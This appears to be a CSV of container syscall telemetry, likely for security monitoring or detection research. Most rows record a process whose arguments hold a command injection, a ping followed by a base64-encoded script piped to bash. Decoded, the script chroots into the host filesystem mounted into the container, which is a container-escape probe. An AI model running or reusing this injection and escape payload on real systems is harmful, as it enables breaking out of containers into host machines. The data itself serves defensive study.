evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
13:16:04.998243513,dup2,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,fd=4(<p>)
13:16:04.998245457,dup2,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=1(<p>) oldfd=4(<p>) newfd=1(<p>)
13:16:04.998246699,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,fd=4(<p>)
13:16:04.998247530,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0
13:16:04.998285029,write,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,fd=1(<p>) size=297
13:16:04.998291030,write,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,res=297 data=IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBh
13:16:04.998298504,exit_group,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
13:16:04.998359610,poll,/:/host:rw:true:rslave,app.py,2,1,6,149740,res=0 fds=
13:16:04.998462296,poll,/:/host:rw:true:rslave,app.py,2,1,6,149740,fds=3:41 timeout=500
13:16:04.998555966,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0 path=/usr/bin/base64
13:16:04.998568910,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
